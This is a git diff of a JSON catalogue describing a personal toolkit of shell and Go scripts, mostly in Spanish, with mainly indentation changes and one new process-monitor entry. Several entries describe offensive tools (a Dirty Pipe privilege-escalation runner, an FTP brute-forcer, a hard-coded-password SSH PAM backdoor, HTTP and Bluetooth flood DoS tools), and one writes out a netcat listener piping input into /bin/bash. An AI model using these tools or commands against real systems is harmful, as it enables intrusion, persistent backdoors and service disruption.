         "short_desc": "Monitorea y verifica hashes de archivos en un directorio.",
         "detailed_desc": "sudo touch /var/log/<directorio>_reports.txt /var/log/<directorio>_history.txt\nsudo chown root:root /var/log/<directorio>_reports.txt /var/log/<directorio>_history.txt\nsudo chmod 644 /var/log/<directorio>_reports.txt /var/log/<directorio>_history.txt"
     },
-    
     "todou": {
         "name": "todou",
         "short_desc": "Actualiza y formatea la lista de alias del sistema.",
         "detailed_desc": "sudo apt-get install -y bsdmainutils\ncp ~/.zshrc /tmp/\ngrep '^alias' /tmp/.zshrc > /tmp/list.txt\nsed -i 's/^[^ ]* //' /tmp/list.txt\nsed -i 's/ *= */=/' /tmp/list.txt\ncolumn -t -s \"=\" /tmp/list.txt > /tmp/lists.txt\nmv /tmp/lists.txt ~/.aliaseses.md"
     },
-    
     "herrabinm": {
         "name": "herrabinm",
         "short_desc": "Descarga y actualiza los binarios de bina.",
         "detailed_desc": "mktemp -d \"/tmp/tmp.bina.XXXXXX\"\ngit clone --depth 1 https://github.com/4rji/bina.git\ncd bina\nsudo cp -a binarios/* /opt/4rji/bin"
     },
-    
     "firefoxephemeral": {
         "name": "firefoxephemeral",
         "short_desc": "Configura Firefox con perfiles efímeros y soporte multilingüe.",
         "detailed_desc": "mkdir -p /tmp/fx-profile\necho \"user_pref('intl.accept_languages', '<lang_code>,en');\nuser_pref('general.useragent.locale', '<lang_code>');\nuser_pref('intl.locale.requested', '<lang_code>');\" > /tmp/fx-profile/user.js"
     },
-    
     "s1pinst": {
         "name": "s1pinst",
         "short_desc": "Instala Docker y verifica la instalación.",
         "detailed_desc": "sudo apt-get install -y docker.io\nsudo yum install -y docker\nsudo dnf install -y docker\nsudo pacman -S docker"
     },
-    
     "pings": {
         "name": "pings",
         "short_desc": "Monitorea el estado de hosts definidos en el archivo de configuración SSH.",
         "detailed_desc": "ping -c 1 <host>"
     },
-    
     "aaron": {
         "name": "aaron",
         "short_desc": "Script para compilar y ejecutar un exploit de escalada de privilegios basado en Dirty Pipe.",
         "detailed_desc": "Este script automatiza el proceso de preparación, compilación y ejecución de un exploit de escalada de privilegios conocido como Dirty Pipe (CVE-2022-0847).\n\nUso: Ejecutar el script directamente.\n\nEl proceso:\n1. Copia el archivo 'noraa' desde una ubicación específica.\n2. Renombra 'noraa' a 'privesc.c'.\n3. Compila 'privesc.c' usando GCC para generar el binario 'privesc'.\n4. Ejecuta el binario 'privesc'.\n5. Proporciona acceso como usuario root si el exploit tiene éxito.\n\nIMPORTANTE: Este script debe usarse únicamente con fines educativos y en entornos controlados. El uso indebido puede ser ilegal y está estrictamente prohibido."
     },
-    
     "archissh": {
         "name": "archissh",
         "short_desc": "Archiva páginas web remotamente usando ArchiveBox a través de SSH.",
         "detailed_desc": "Este script permite archivar páginas web de forma remota usando ArchiveBox a través de una conexión SSH. Requiere configurar la variable de entorno 'archiveserv' con el usuario y host del servidor remoto.\n\nUso:\n1. Configura la variable de entorno archiveserv en ~/.zshrc\n2. Ejecuta el script y proporciona:\n   - URL de la página web a archivar\n   - Profundidad de rastreo (0-3+ niveles)\n   - Contraseña sudo del servidor remoto\n\nEl script:\n- Agrega automáticamente 'https://' si es necesario\n- Ejecuta ArchiveBox en el servidor remoto usando Docker\n- Permite controlar la profundidad del rastreo\n- Muestra el comando ejecutado para transparencia"
     },
-    
     "abrireph-ext-file": {
         "name": "abrireph-ext-file",
         "short_desc": "Extrae un archivo específico de un contenedor Docker en ejecución con instrucciones guiadas",
@@ -439,13 +361,13 @@
     },
     "ftpbrute": {
         "name": "ftpbrute",
-         "short_desc": "Brute-force FTP login using Go FTP client",
-         "detailed_desc": "Usage: ./ftpbrutem host:port username wordlist.txt\n\nThis tool iterates through each password in the specified wordlist and attempts to authenticate to the FTP server using the Go `github.com/jlaffaye/ftp` package. It reports progress at regular intervals and stops when valid credentials are found."
+        "short_desc": "Brute-force FTP login using Go FTP client",
+        "detailed_desc": "Usage: ./ftpbrutem host:port username wordlist.txt\n\nThis tool iterates through each password in the specified wordlist and attempts to authenticate to the FTP server using the Go `github.com/jlaffaye/ftp` package. It reports progress at regular intervals and stops when valid credentials are found."
     },
     "sshbackdoor": {
         "name": "sshbackdoor",
-          "short_desc": "Installs a PAM module for SSH using a hard‑coded password.",
-          "detailed_desc": "Builds and installs a custom PAM module (`pam_verify_auth.so`) that accepts a single hard‑coded password for SSH logins.\n\nRequirements:\n- Linux with SSH daemon\n- `sudo`, `gcc` (Debian/Ubuntu: `sudo apt-get install gcc` | RHEL/CentOS: `sudo yum install gcc`)\n- PAM development headers (Debian/Ubuntu: `sudo apt-get install libpam0g-dev` | RHEL/CentOS: `sudo yum install pam-devel`)\n\nUsage:\n  sshbackdoor Secret-Word\n  sudo systemctl restart sshd"
+        "short_desc": "Installs a PAM module for SSH using a hard‑coded password.",
+        "detailed_desc": "Builds and installs a custom PAM module (`pam_verify_auth.so`) that accepts a single hard‑coded password for SSH logins.\n\nRequirements:\n- Linux with SSH daemon\n- `sudo`, `gcc` (Debian/Ubuntu: `sudo apt-get install gcc` | RHEL/CentOS: `sudo yum install gcc`)\n- PAM development headers (Debian/Ubuntu: `sudo apt-get install libpam0g-dev` | RHEL/CentOS: `sudo yum install pam-devel`)\n\nUsage:\n  sshbackdoor Secret-Word\n  sudo systemctl restart sshd"
     },
     "dnsblock": {
         "name": "dnsblock",
@@ -462,36 +384,31 @@
         "short_desc": "Transfers files to remote hosts using rsync over SSH.",
         "detailed_desc": "The script reads the SSH configuration file (~/.ssh/config) to extract host details such as usernames, hostnames, and ports. It allows the user to select a host from the available options and transfers the specified file to the selected host using rsync. Usage: ./copyrs <filename>."
     },
-
     "ataquehttp": {
         "name": "ataquehttp",
         "short_desc": "Configura y ejecuta GoldenEye para pruebas de estrés HTTP.",
         "detailed_desc": "Este script automatiza la configuración y ejecución de GoldenEye, una herramienta de prueba de estrés HTTP.\n\nEl proceso:\n1. Descomprime el archivo GoldenEye-master.zip desde /opt/4rji/bin\n2. Cambia al directorio descomprimido en /tmp/GoldenEye-master\n3. Asegura que el script Python tenga permisos de ejecución\n4. Proporciona instrucciones para ejecutar el script con la URL objetivo\n\nOpciones más comunes en GoldenEye:\n• -u: especificar archivo de user-agents\n• -w: número de workers (hilos)\n• -s: número de sockets por worker\n• -m: método HTTP (get, post, random)\n• -n: desactiva verificación SSL\n• -d: modo debug (salida más detallada)\n\nEjemplo de uso:\n./goldeneye.py https://objetivo.com -w 50 -s 1000 -m random -n\n\nIMPORTANTE: Este script debe usarse únicamente con fines educativos y en entornos controlados. El uso indebido puede ser ilegal y está estrictamente prohibido."
     },
     "dominf": {
-    "name": "dominf",
-    "short_desc": "Interactive reconnaissance and enumeration tool for domains.",
-    "detailed_desc": "DomInf is an interactive and fast Go-based tool for gathering information about domains. It allows users to perform tasks like bypassing Cloudflare protection, scanning common TCP ports, grabbing service banners, doing reverse PTR lookups, checking real IP via DNS and HTTP headers, testing for DNS zone transfers, brute-forcing subdomains, and resolving DNS records (A and AAAA). The tool provides a menu-driven interface and saves output to a log file for later analysis. Usage: 'go run dominf.go <domain>'."
+        "name": "dominf",
+        "short_desc": "Interactive reconnaissance and enumeration tool for domains.",
+        "detailed_desc": "DomInf is an interactive and fast Go-based tool for gathering information about domains. It allows users to perform tasks like bypassing Cloudflare protection, scanning common TCP ports, grabbing service banners, doing reverse PTR lookups, checking real IP via DNS and HTTP headers, testing for DNS zone transfers, brute-forcing subdomains, and resolving DNS records (A and AAAA). The tool provides a menu-driven interface and saves output to a log file for later analysis. Usage: 'go run dominf.go <domain>'."
     },
-
     "locip": {
-    "name": "locip",
-    "short_desc": "Geo-localiza IPs usando GeoLite2 mostrando ciudad, región y país.",
-    "detailed_desc": "Este script en Go utiliza la base de datos GeoLite2-City para geolocalizar direcciones IP. Permite recibir una IP individual como argumento o un archivo de texto (como 'ips.txt') que contenga múltiples IPs, línea por línea. Si no se especifica argumento, intenta leer automáticamente 'ips.txt'. Muestra la ciudad, región (si está disponible) y país asociados a cada IP. Usa la librería 'geoip2-golang' para acceder a la base de datos MaxMind."
+        "name": "locip",
+        "short_desc": "Geo-localiza IPs usando GeoLite2 mostrando ciudad, región y país.",
+        "detailed_desc": "Este script en Go utiliza la base de datos GeoLite2-City para geolocalizar direcciones IP. Permite recibir una IP individual como argumento o un archivo de texto (como 'ips.txt') que contenga múltiples IPs, línea por línea. Si no se especifica argumento, intenta leer automáticamente 'ips.txt'. Muestra la ciudad, región (si está disponible) y país asociados a cada IP. Usa la librería 'geoip2-golang' para acceder a la base de datos MaxMind."
     },
-
     "nmapfiref": {
         "name": "nmapfiref",
         "short_desc": "Realiza escaneos de puertos con NMAP y guarda los resultados en formato XML.",
         "detailed_desc": "Este script permite realizar dos tipos de escaneos de puertos usando NMAP:\n\n1. Escaneo básico: Utiliza las opciones -v --reason -sS para un escaneo rápido y básico\n2. Escaneo avanzado: Utiliza -A -O -sV para un análisis más detallado incluyendo detección de SO y versiones de servicios\n\nEl script primero procesa un archivo de IPs (ips.txt) para agrupar direcciones IP similares, luego permite elegir el tipo de escaneo a realizar y finalmente ejecuta NMAP guardando los resultados en formato XML con estilos XSL.\n\nLos resultados se guardan en puertos.xml y pueden ser visualizados con un navegador web gracias al stylesheet incluido."
     },
-
     "sheldonf": {
         "name": "sheldonf",
         "short_desc": "Envía archivos a través de una conexión TCP a una IP y puerto específicos.",
         "detailed_desc": "Este script Python permite enviar archivos a través de una conexión TCP a una dirección IP y puerto específicos.\n\nUso: ./sheldonf <IP> <puerto> <archivo>\n\nEn la máquina receptora, ejecutar:\n- Para recibir archivos: nc -l -p 1235 > archivo\n- Para ejecutar comandos: nc -l -p 1234 | /bin/bash\n\nEl script:\n1. Establece una conexión TCP con la IP y puerto especificados\n2. Lee el contenido del archivo a enviar\n3. Transmite el archivo a través de la conexión\n4. Muestra mensajes de estado con colores para mejor visibilidad\n\nÚtil para transferir archivos o ejecutar comandos de forma remota a través de conexiones TCP."
     },
-
     "siegee": {
         "name": "siegee",
         "short_desc": "Simulador de tráfico HTTP concurrente tipo Siege escrito en Go.",
@@ -507,37 +424,31 @@
         "short_desc": "Simulador de navegación web concurrente a sitios populares.",
         "detailed_desc": "Este script simula tráfico web realista enviando múltiples solicitudes HTTP a una lista de sitios populares como Facebook, YouTube, Instagram, etc. Utiliza goroutines en Go para generar múltiples conexiones en paralelo, lo que permite ajustar el volumen de tráfico enviado. También permite especificar un único objetivo (IP o dominio) como parámetro, reemplazando la lista de sitios por defecto.\n\nParámetros solicitados al ejecutar:\n- Duración de la sesión en minutos (0 = infinito)\n- Delay entre solicitudes en segundos (0 = tráfico rápido)\n- Número de trabajadores (conexiones simultáneas)\n\nTambién puede usarse así:\n  go run trafico.go <sitio_o_ip>\n\nEjemplo:\n  go run trafico.go http://192.168.1.10:8080\n\nEn este modo, todas las solicitudes se dirigirán únicamente a la URL o IP indicada, útil para pruebas dirigidas. El tráfico es completamente válido (HTTP GET), simulando navegación de usuario sin generar errores en servidores con controles básicos. Al finalizar, muestra las URLs que fueron accedidas."
     },
-
     "webmonitor": {
         "name": "webmonitor",
         "short_desc": "HTTP server in Go for real-time web traffic monitoring.",
         "detailed_desc": "This script launches a web server that logs and visualizes HTTP requests in real-time, displaying a graphical interface with 'traffic light' indicators (green, yellow, red). It exposes the routes '/' (redirect), '/monitor' (dashboard), '/status' (JSON API count), and '/reset' (log reset). Uses `Chart.js` to graphically represent requests received in the last 60 seconds. Also automatically detects the server's IP to display test commands like `siege` or `curl`. Ideal for load testing and local demonstrations. Run with:\n\n  go run webmonitor.go\n\nAnd access via:\n\n  http://<your-local-ip>:8080/monitor\n\nSupports automatic browser opening on startup.\n\nFor testing, run in another terminal:\n  siege -c 255 -r 1000 http://192.168.142.17:8080/\n  while true; do curl -s http://192.168.142.17:8080/ > /dev/null; done"
     },
-
     "scanbl": {
         "name": "scanbl",
         "short_desc": "Scan nearby Bluetooth Classic devices and select one.",
         "detailed_desc": "This Go script uses 'bluetoothctl scan on' to scan for nearby Bluetooth Classic devices. It captures the MAC and name of each detected device, displays them in a numbered list, saves the output to 'scan_result.txt', and allows the user to select one device by index. It then prints the selected MAC and name for use in further scripts. This script helps quickly identify and target Bluetooth devices for manual or automated interaction."
     },
-
     "ataquebl": {
         "name": "ataquebl",
         "short_desc": "Bluetooth DoS script using multithreaded l2ping flood.",
         "detailed_desc": "This Go script launches multiple threads that each execute the 'l2ping' command with flood mode (-f) against a specified Bluetooth MAC address using a selected HCI interface (e.g., hci1). The user provides the target MAC and the number of threads to launch. The script displays colored output showing each command being executed per thread, simulating a DoS-style pressure on the target device. It's intended for use in testing how devices react to ping flood attacks over Bluetooth Classic. Example usage: 'sudo ./ataquebl XX:XX:XX:XX:XX:XX 10'."
-        },
-
+    },
     "bateria": {
         "name": "bateria",
         "short_desc": "Monitorea el estado de la batería y el adaptador de corriente.",
         "detailed_desc": "Este script utiliza comandos del sistema para obtener información sobre el estado de la batería y el adaptador de corriente. Ejecuta `upower` para extraer datos como el consumo de energía y el tiempo estimado para carga completa, y `acpi` para verificar si el adaptador de corriente está conectado. Muestra el consumo de energía en vatios y el tiempo estimado para carga completa en minutos, además de la conexión del adaptador de corriente."
     },
-
     "blockicmp": {
         "name": "blockicmp",
         "short_desc": "Blocks ICMP (ping) requests at the firewall level.",
         "detailed_desc": "This script configures the system's firewall to block ICMP echo requests (pings) to prevent potential network reconnaissance and denial of service attacks.\n\nUsage: sudo ./blockicmp\n\nProcess:\n1. Checks if running with root privileges\n2. Configures iptables to drop incoming ICMP echo requests\n3. Saves the firewall rules to persist across reboots\n4. Verifies the rules are properly applied\n\nExternal commands used:\n- iptables for firewall configuration\n- iptables-save to persist rules\n\nIMPORTANT: This script requires root privileges and may affect legitimate network monitoring tools that rely on ICMP."
     },
-
     "blockip-tables": {
         "name": "blockip-tables",
         "short_desc": "Configura un conjunto de IPs bloqueadas usando ipset e iptables.",
@@ -569,9 +480,9 @@
         "detailed_desc": "Este script en Bash solicita una palabra o frase al usuario y la busca en todos los archivos del directorio proporcionado como argumento. Verifica si el directorio existe y recorre cada archivo con grep. Si encuentra coincidencias, muestra el nombre del archivo y su contenido completo. Es útil para localizar rápidamente texto específico en archivos de configuración, logs o documentos planos dentro de una carpeta."
     },
     "sshforward": {
-          "name": "sshforward",
-          "short_desc": "Reverse SSH port forwarding over Paramiko.",
-          "detailed_desc": "Creates a reverse SSH tunnel using Python and Paramiko. It connects to a remote SSH server and opens a remote port that forwards traffic back to a specified host:port accessible from the local machine. Equivalent to 'ssh -R', useful for exposing local services remotely. Supports password or key authentication and can be automated or integrated into other Python tools."
+        "name": "sshforward",
+        "short_desc": "Reverse SSH port forwarding over Paramiko.",
+        "detailed_desc": "Creates a reverse SSH tunnel using Python and Paramiko. It connects to a remote SSH server and opens a remote port that forwards traffic back to a specified host:port accessible from the local machine. Equivalent to 'ssh -R', useful for exposing local services remotely. Supports password or key authentication and can be automated or integrated into other Python tools."
     },
     "deploy": {
         "name": "deploy",
@@ -629,24 +540,24 @@
         "detailed_desc": "Este script lanza un contenedor Docker con Apache usando la imagen httpd:alpine para servir archivos de video desde la carpeta /home/ass/video-downoad. Antes de iniciar, muestra todas las IPs locales disponibles para que el usuario sepa desde qué dirección puede acceder al servidor. El servicio queda disponible en el puerto 10999. Uso: ejecutar el script y luego acceder vía navegador o Infuse a http://<IP>:10999/"
     },
     "fkinst": {
-    "name": "fkinst",
-    "short_desc": "Instala y configura thefuck para corrección de comandos en Zsh.",
-    "detailed_desc": "Este script instala la herramienta 'thefuck' usando pip, muestra la ubicación de instalación, crea un enlace simbólico en /opt/4rji/bin/, y agrega alias de uso al archivo .zshrc para habilitar su funcionalidad en el shell Zsh."
+        "name": "fkinst",
+        "short_desc": "Instala y configura thefuck para corrección de comandos en Zsh.",
+        "detailed_desc": "Este script instala la herramienta 'thefuck' usando pip, muestra la ubicación de instalación, crea un enlace simbólico en /opt/4rji/bin/, y agrega alias de uso al archivo .zshrc para habilitar su funcionalidad en el shell Zsh."
     },
     "luks": {
-    "name": "luks",
-    "short_desc": "Crea y monta contenedores cifrados LUKS de forma interactiva.",
-    "detailed_desc": "Este script interactivo solicita tamaño y nombre para crear un contenedor LUKS. Luego crea un archivo, lo cifra con cryptsetup, lo abre, lo formatea con ext4, y lo monta en /mnt/nombre. También muestra los comandos necesarios para desmontar y volver a montar el contenedor posteriormente."
+        "name": "luks",
+        "short_desc": "Crea y monta contenedores cifrados LUKS de forma interactiva.",
+        "detailed_desc": "Este script interactivo solicita tamaño y nombre para crear un contenedor LUKS. Luego crea un archivo, lo cifra con cryptsetup, lo abre, lo formatea con ext4, y lo monta en /mnt/nombre. También muestra los comandos necesarios para desmontar y volver a montar el contenedor posteriormente."
     },
     "logloop": {
-    "name": "logloop",
-    "short_desc": "Ejecuta un binario en bucle infinito con reinicio automático.",
-    "detailed_desc": "Este script ejecuta un binario proporcionado como argumento dentro de un bucle infinito usando 'nohup' para que continúe ejecutándose tras cerrar la terminal. El binario se reinicia cada 2 segundos después de finalizar. Toda la salida estándar y de error se redirige al archivo 'log.txt'. Uso: ./kigt <ruta_al_binario>."
+        "name": "logloop",
+        "short_desc": "Ejecuta un binario en bucle infinito con reinicio automático.",
+        "detailed_desc": "Este script ejecuta un binario proporcionado como argumento dentro de un bucle infinito usando 'nohup' para que continúe ejecutándose tras cerrar la terminal. El binario se reinicia cada 2 segundos después de finalizar. Toda la salida estándar y de error se redirige al archivo 'log.txt'. Uso: ./kigt <ruta_al_binario>."
     },
     "encryp": {
-    "name": "encryp",
-    "short_desc": "script; encryp",
-    "detailed_desc": "Usage:\n  encryp -e FileOrDirectory [-p password | -k keyfile]\n  encryp -d FileOrDirectory [-p password | -k keyfile]\n\nFlags:\n  -e           Encrypt mode (required with -d false)\n  -d           Decrypt mode (required with -e false)\n  -p [pass]    Password to derive encryption key (prompts if omitted)\n  -k <keyfile> Key file path for AES-256 key (default: encryption_key.key)\n\nExamples:\n  encryp -e /tmp/data\n  encryp -d /tmp/data -k encryption_key.key\n  encryp -e /tmp/data -p\n  encryp -e /tmp/data -p mypass\n  encryp -d /tmp/data -p"
+        "name": "encryp",
+        "short_desc": "script; encryp",
+        "detailed_desc": "Usage:\n  encryp -e FileOrDirectory [-p password | -k keyfile]\n  encryp -d FileOrDirectory [-p password | -k keyfile]\n\nFlags:\n  -e           Encrypt mode (required with -d false)\n  -d           Decrypt mode (required with -e false)\n  -p [pass]    Password to derive encryption key (prompts if omitted)\n  -k <keyfile> Key file path for AES-256 key (default: encryption_key.key)\n\nExamples:\n  encryp -e /tmp/data\n  encryp -d /tmp/data -k encryption_key.key\n  encryp -e /tmp/data -p\n  encryp -e /tmp/data -p mypass\n  encryp -d /tmp/data -p"
     },
     "tlscheck": {
         "name": "tlscheck",
@@ -657,6 +568,10 @@
         "name": "receiver",
         "short_desc": "Escucha en 0.0.0.0:1235 para recibir archivos via netcat.",
         "detailed_desc": "Este binario inicia un listener en 0.0.0.0:1235 y muestra las interfaces IPv4 disponibles. Indica como enviar un archivo desde otro host con: nc -q 0 <listener-ip> 1235 < archivo. Util para recibir archivos rapidamente con netcat hasta que el usuario presione Ctrl+C."
+    },
+    "backde-legacy": {
+        "name": "backde-legacy",
+        "short_desc": "Monitor interactivo de conexiones activas y actividad de procesos.",
+        "detailed_desc": "Este binario en Go lista procesos con conexiones de red activas (TCP establecidas y sockets UDP), excluye navegadores comunes, y permite seleccionar un proceso por índice, PID o nombre. Luego muestra una vista de actividad en tiempo real con usuario, estado, padre, comando ejecutado, uso de CPU y memoria, hilos, file descriptors, cambios de contexto, contadores de I/O y endpoints remotos con resolución reversa cuando aplica. Acepta refresco configurable (por defecto 10 segundos, por ejemplo `-2` o `--refresh 2`), se relanza con `sudo` automáticamente si no tiene privilegios, registra escaneos en `backde.log`, y desde la vista interactiva permite volver al menú, salir o terminar el proceso seleccionado."
     }
-
 }
